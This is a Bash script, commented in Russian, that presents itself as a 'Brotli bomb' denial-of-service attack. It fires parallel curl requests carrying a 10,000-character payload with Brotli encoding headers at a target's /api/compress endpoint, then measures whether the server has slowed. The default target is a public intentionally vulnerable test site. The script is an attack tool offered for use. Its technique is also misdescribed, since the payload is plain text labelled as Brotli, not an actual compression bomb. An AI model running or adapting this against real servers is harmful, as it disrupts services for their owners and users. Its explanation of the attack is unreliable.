#!/bin/bash
# ╔══════════════════════════════════════════════╗
# ║   🟡 BROTLI BOMB — Атака через сжатие       ║
# ╚══════════════════════════════════════════════╝
TARGET=${1:-"http://testphp.vulnweb.com"}
echo "╔══════════════════════════════════════════════╗"
echo "║   💥 BROTLI BOMB — Атака через сжатие       ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Техника: сервер сжимает ответы в Brotli. Мы отправляем запрос
# с вредоносным payload'ом, который при сжатии становится бомбой.
# Когда сервер пытается сжать наш ответ — он зависает.

BOMB_PAYLOAD=$(python3 -c "print('A' * 10000)" 2>/dev/null || echo "AAAAAAAAAA...")

echo "[BROTLI] 💥 Отправляю Brotli-бомбу..."
for i in $(seq 1 5); do
    curl -sk --max-time 10 \
        -H "Accept-Encoding: br" \
        -H "Content-Encoding: br" \
        -d "$BOMB_PAYLOAD" \
        "$TARGET/api/compress" \
        -o /dev/null -w "  💥 Запрос #$i: HTTP %{http_code}\n" 2>/dev/null &
done
wait

# Проверяем — сервер замедлился?
START=$(date +%s%N 2>/dev/null || date +%s)
curl -sk --max-time 10 "$TARGET" -o /dev/null 2>/dev/null
END=$(date +%s%N 2>/dev/null || date +%s)
ELAPSED=$(( (END - START) / 1000000 ))
echo "  ⏱️ Время ответа после бомбы: ${ELAPSED}ms"

[ "$ELAPSED" -gt 3000 ] && echo "  💀 СЕРВЕР ЗАМЕДЛЕН! Brotli-бомба сработала." || echo "  ✅ Сервер держится."
echo "[BROTLI] ✅ Атака завершена"
